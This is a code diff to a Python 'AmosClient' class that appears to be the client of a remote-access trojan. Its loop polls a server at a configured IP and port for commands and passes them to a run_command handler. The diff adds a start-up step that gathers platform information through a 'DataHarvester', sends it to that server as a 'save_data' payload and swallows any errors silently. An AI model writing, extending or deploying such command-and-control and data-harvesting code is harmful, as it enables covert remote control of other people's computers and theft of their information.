@@ -4,9 +4,12 @@ from DataHarvester import DataHarvester
 import subprocess
 import time
 import os
+import json
+
 
 
 class AmosClient:
+
 
     def __init__(self, ip, port):
         self.ip = ip
@@ -15,7 +18,25 @@ class AmosClient:
         self.data_harvester = DataHarvester()
 
 
+
+    def create_json_payload(self, action, data):
+        payload = {
+            "action": action,
+            "data": data
+        }
+        return json.dumps(payload)
+
+
     def start(self):
+
+        try:
+            action_param = "save_data"
+            data_param = self.data_harvester.get_platform_info()
+            json_payload = self.create_json_payload(action_param, data_param)
+            self.server_handler.send_data(json_payload)
+        except:
+            pass
+
 
         while True:
             command = request.urlopen(f"http://{self.ip}:{self.port}").read().decode()
@@ -30,7 +51,7 @@ class AmosClient:
                 continue
 
             # Send file
-            if command == "check call":
+            if command == "connected":
                 self.server_handler.send_data("active")
                 continue
 
@@ -42,6 +63,7 @@ class AmosClient:
 
             self.server_handler.run_command(command)
             time.sleep(1)
+
 
 
 
